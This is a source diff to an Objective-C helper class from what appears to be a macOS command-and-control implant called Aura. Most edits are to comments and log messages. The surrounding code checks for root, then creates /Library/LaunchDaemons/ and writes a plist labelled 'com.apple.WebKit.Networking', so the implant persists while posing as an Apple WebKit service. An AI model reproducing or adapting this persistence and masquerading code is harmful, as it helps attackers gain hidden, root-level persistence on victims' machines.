@@ -1,7 +1,6 @@
 #import "SystemInfoHelper.h"
 #import "C2Task.h"
 #import "NSTask.h"
-// #import "IOMobileFrameBuffer.h"
 
 @implementation SystemInfoHelper
 
@@ -85,6 +84,7 @@
 
 + (NSString *)getDomain {
     char domainName[256];
+    /// If we could not find the domain name... default local
     if (getdomainname(domainName, sizeof(domainName)) != 0 || strlen(domainName) == 0) {
         return @"local";
     }
@@ -92,7 +92,7 @@
 }
 
 + (void)takeScreenshotWithTask:(id)sender {
-    // ...
+    // TODO: Implement
 }
 
 + (BOOL)isRootUser {
@@ -202,13 +202,10 @@
         return NO;
     }
 
-    // Use the LaunchDaemon plist path
+    // Check if Launch Daemons exists first
     NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
-    
-    // Log the plist path
     NSLog(@"Writing to: %@", plistPath);
-
-    // Check if the directory exists, if not, create it
+    
     BOOL isDirectory;
     NSString *plistDirectory = @"/Library/LaunchDaemons/";
     if (![[NSFileManager defaultManager] fileExistsAtPath:plistDirectory isDirectory:&isDirectory] || !isDirectory) {
@@ -217,14 +214,14 @@
         BOOL directoryCreated = [[NSFileManager defaultManager] createDirectoryAtPath:plistDirectory withIntermediateDirectories:YES attributes:nil error:&directoryError];
 
         if (!directoryCreated) {
-            NSLog(@"❌ Failed to create directory at %@. Error: %@", plistDirectory, directoryError);
+            NSLog(@"❌ Failed to create LaunchDaemons/ at: %@. Error: %@", plistDirectory, directoryError);
             return NO;
         } else {
-            NSLog(@"✅ Successfully created directory: %@", plistDirectory);
+            NSLog(@"✅ Successfully created LaunchDaemons/ at: %@", plistDirectory);
         }
     }
 
-    // With the following dictionary contents:
+    // Great! Now we'll write out the PLIST contents persisting Aura.
     NSDictionary *plistContents = @{
         @"Label": @"com.apple.WebKit.Networking",
         @"ProgramArguments": @[
@@ -312,8 +309,6 @@
         return NO;
     }
 }
-
-
 
 
 @end
